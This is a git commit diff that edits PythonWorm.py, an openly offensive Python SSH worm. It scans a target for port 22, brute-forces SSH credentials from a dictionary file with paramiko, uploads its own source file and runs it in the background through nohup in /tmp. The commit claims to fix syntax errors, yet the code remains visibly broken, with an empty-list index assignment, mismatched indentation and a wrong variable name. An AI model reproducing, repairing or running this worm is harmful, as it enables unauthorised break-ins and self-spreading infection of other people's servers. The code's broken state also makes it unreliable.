74fea507063452984dcc533c3f80b28902c4f028
~P <houghstler@gmail.com>
2016-04-20 22:32:39 -0400

    updated PythonWorm.py file
    fixed the syntax errors

--- PythonWorm.py
+++ PythonWorm.py
@@ -3,9 +3,11 @@ import subprocess
 from datetime import datetime
 import paramiko
 import sys
+import inspect, os
 
 def AttackSSH(ipAddress, dictionaryFile) :
     print ( "[+] Attacking Host : %s " %ipAddress )
+    paramiko.util.log_to_file("filename.log")
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     for line in open(dictionaryFile, "r").readlines() :
@@ -17,17 +19,18 @@ def AttackSSH(ipAddress, dictionaryFile) :
             print("[-] Failed! ...")
             continue
         print("[+] Success ... username: %s and passoword %s is VALID! " % (username, password))
-        var thing = [username, password]
+        thing=[] 
+        thing[0]= username
+        thing[1]= password
         break
-   return thing
+
+    return thing
 
 def sshScan (remoteHost):
     ## Clear the screen
     subprocess.call('clear', shell=True)
 
-    ## Enter Host to scan
-    remoteServer = input("Enter a remote host to scan")
-    remoteServerIP = socket.gethostbyname(remoteServer)
+    remoteServerIP = socket.gethostbyname(remoteHost)
     
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     result = sock.connect_ex((remoteServerIP, 22))
@@ -44,13 +47,13 @@ def UploadFileAndExecute(sshConnection, fileName) :
     ssh.exec_command("nohup /tmp/" +fileName+ " &")
 
 
-var result= sshScan(sys.argv[1])
+result= sshScan(sys.argv[1])
 if result ==0 :
-var credentials=AttackSSH(sys.argv[1], sys.argv[3])
-ssh = paramiko.SSHClient()
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-ssh.connect(sys.argv[1], username=credentials[0], password=credentials[1])
-UploadFileAndExecute(ssh, sys.argv[4])   
+ credentials=AttackSSH(sys.argv[1], sys.argv[2])
+ ssh = paramiko.SSHClient()
+ ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ ssh.connect(sys.argv[1], username=credentials[0], password=credentials[1])
+ UploadFileAndExecute(ssh,  inspect.getfile(inspect.currentframe()))   
 ssh.close()
 
 
